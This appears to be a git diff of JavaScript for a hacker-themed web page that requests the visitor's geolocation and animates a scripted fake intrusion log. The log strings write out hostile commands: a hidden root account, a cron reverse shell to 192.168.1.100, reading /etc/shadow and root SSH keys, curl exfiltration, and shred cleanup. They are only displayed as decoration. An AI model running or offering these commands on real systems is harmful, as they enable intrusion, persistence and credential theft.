@@ -154,12 +154,11 @@ function showWhiteRabbit() {
     showWhiteRabbit();
   }, 60000); // Adjust interval (5000ms = 5 seconds)
   
-  // Populate system and network information dynamically
-function getSystemInfo() {
+  function populatePanels() {
     const systemInfo = document.getElementById('system-info');
     const networkInfo = document.getElementById('network-info');
   
-    // System information
+    // **System Information**
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
     const language = navigator.language;
@@ -171,31 +170,181 @@ function getSystemInfo() {
       <li><strong>User Agent:</strong> ${userAgent}</li>
       <li><strong>Language:</strong> ${language}</li>
       <li><strong>Screen:</strong> ${screenWidth} x ${screenHeight}</li>
-    `;
+    `;  
+    // **Geolocation**
+    navigator.geolocation.getCurrentPosition(position => {
+      const { latitude, longitude } = position.coords;
+      systemInfo.innerHTML += `
+        <li><strong>Latitude:</strong> ${latitude.toFixed(4)}</li>
+        <li><strong>Longitude:</strong> ${longitude.toFixed(4)}</li>
+      `;
+    });
   
-    // Network information
-    const connection = navigator.connection || {};
-    const downlink = connection.downlink || 'Unknown';
-    const effectiveType = connection.effectiveType || 'Unknown';
-  
-    networkInfo.innerHTML = `
-      <li><strong>IP Address:</strong> Fetching...</li>
-      <li><strong>Downlink Speed:</strong> ${downlink} Mbps</li>
-      <li><strong>Network Type:</strong> ${effectiveType}</li>
-    `;
-  
-    // Fetch IP address
-    fetch('https://api64.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ipItem = document.querySelector('#network-info li:first-child');
-        ipItem.innerHTML = `<strong>IP Address:</strong> ${data.ip}`;
-      })
-      .catch(err => {
-        console.error('Error fetching IP:', err);
-      });
+    // **Fake CPU Usage**
+    setInterval(() => {
+      const cpuUsage = (Math.random() * 100).toFixed(1);
+      const existingCpu = document.getElementById('cpu-usage');
+      if (existingCpu) existingCpu.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
+      else {
+        const cpuElement = document.createElement('li');
+        cpuElement.id = 'cpu-usage';
+        cpuElement.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
+        systemInfo.appendChild(cpuElement);
+      }
+    }, 2000);
+
+    setInterval(() => {
+      const randomLog = logs[Math.floor(Math.random() * logs.length)];
+      networkInfo.innerHTML += `<li>${randomLog}</li>`;
+    }, 3000);
   }
   
-  // Run the function on page load
-  getSystemInfo();
+  // Run the function
+  populatePanels();
   
+  const logs = [
+  // Reconnaissance
+  'nmap -sS -Pn -T4 -p- 192.168.1.1',
+  '[+] Discovered open port: 22 (ssh)',
+  '[+] Discovered open port: 80 (http)',
+  '[+] Discovered open port: 445 (smb)',
+  '[!] Possible SMB vulnerability detected: MS17-010 (EternalBlue)',
+  'gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
+  '[+] Found directory: /admin',
+  '[+] Found directory: /config',
+
+  // Exploitation
+  'ssh admin@192.168.1.1',
+  '[!] Attempting brute force with rockyou.txt...',
+  '[+] Successful SSH login: admin:password123',
+  '[+] Escalating privileges...',
+  'sudo -l',
+  '[+] Exploiting sudo misconfiguration...',
+
+  // Persistence
+  'useradd -ou 0 -g 0 -M -r -s /bin/bash secretadmin',
+  'echo "secretadmin:secretpassword" | chpasswd',
+  '[+] Created hidden admin account: secretadmin',
+  'echo "* * * * * bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/crontab',
+  '[+] Installed cron job for reverse shell persistence',
+
+  // Privilege Escalation
+  'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
+  'chmod +x /tmp/linpeas.sh',
+  './linpeas.sh | tee /tmp/linpeas_output.txt',
+  '[+] Detected vulnerable SUID binary: /usr/bin/vuln_suid',
+  '[+] Exploiting /usr/bin/vuln_suid for root access...',
+
+  // Credential Harvesting
+  'cat /etc/shadow',
+  '[+] Extracted /etc/shadow contents',
+  'cat /root/.ssh/id_rsa',
+  '[+] Found private SSH key for root user',
+
+  // Lateral Movement
+  'ssh -i /tmp/root_key root@192.168.1.2',
+  '[+] Successfully logged into 192.168.1.2 as root',
+  'cat /etc/shadow',
+  '[+] Extracted /etc/shadow from 192.168.1.2',
+
+  // Exfiltration
+  '[+] Preparing sensitive data for exfiltration...',
+  'tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh',
+  '[+] Compressed sensitive files: sensitive_data.tar.gz',
+  'openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey',
+  '[+] Encrypted data: /tmp/data.enc',
+
+  // HTTP Transfer
+  'curl -X POST -F "file=@/tmp/data.enc" http://192.168.1.100/upload',
+  '[+] Data successfully exfiltrated to 192.168.1.100 via HTTP',
+
+  // Cleanup
+  'shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key',
+  '[+] Cleaned up sensitive files from the target system',
+  '[!] Exfiltration complete. Exiting...'
+];
+  
+let currentLogIndex = 0;
+
+function generateFakeLogs() {
+  const networkInfo = document.getElementById('network-info');
+
+  if (currentLogIndex < logs.length) {
+    const logEntry = logs[currentLogIndex];
+    const logElement = document.createElement('li');
+
+    // Simulate typing effect for user commands
+    if (!logEntry.startsWith('[')) {
+      simulateTyping(logEntry, logElement, () => {
+        networkInfo.appendChild(logElement);
+        processNextLog();
+      });
+      console.log(logEntry);
+    } else if (logEntry.includes('curl') || logEntry.includes('ftp')) {
+        // Simulate progress for data transfer actions
+        simulateProgress(logElement, logEntry, () => {
+          networkInfo.appendChild(logElement);
+          processNextLog();
+        });
+    } else {
+      logElement.textContent = logEntry;
+      networkInfo.appendChild(logElement);
+      processNextLog();
+    }
+  } else {
+    // Restart after a longer delay
+    currentLogIndex = 0;
+    setTimeout(generateFakeLogs, 8000); // 8 seconds before restarting logs
+  }
+}
+
+function processNextLog() {
+  currentLogIndex++;
+  const logEntry = logs[currentLogIndex - 1];
+  const delay = logEntry.includes('curl') || logEntry.includes('tar') ? 5000 : 3000; // Longer delay for intensive actions
+  setTimeout(generateFakeLogs, delay);
+}
+
+// Simulate typing effect for user commands
+function simulateTyping(text, logElement, callback) {
+    let i = 0;
+    logElement.textContent = ''; // Clear previous content
+  
+    function typeNextCharacter() {
+      if (i < text.length) {
+        logElement.textContent += text.charAt(i); // Add one character at a time
+        i++;
+        
+        // Random typing interval with jitter
+        const typingSpeed = 150 + Math.random() * 100; // Base speed (150ms) + jitter (0-100ms)
+        setTimeout(typeNextCharacter, typingSpeed);
+      } else {
+        callback(); // Invoke the callback after typing finishes
+      }
+    }
+  
+    typeNextCharacter(); // Start typing
+  }
+
+// Simulate progress for certain actions
+function simulateProgress(logElement, logEntry) {
+  logElement.textContent = 'Uploading: 0%';
+  const networkInfo = document.getElementById('network-info');
+  networkInfo.appendChild(logElement);
+
+  let progress = 0;
+  const interval = setInterval(() => {
+    progress += 5; // Increment progress
+    logElement.textContent = `Uploading: ${Math.min(progress, 100)}%`;
+
+    if (progress >= 100) {
+      clearInterval(interval);
+      logElement.textContent = logEntry.includes('curl')
+        ? '[+] Data successfully exfiltrated to 192.168.1.100 via HTTP'
+        : '[+] Data successfully uploaded via FTP';
+    }
+  }, 300); // Update progress every 300ms
+}
+
+// Start generating logs
+generateFakeLogs();
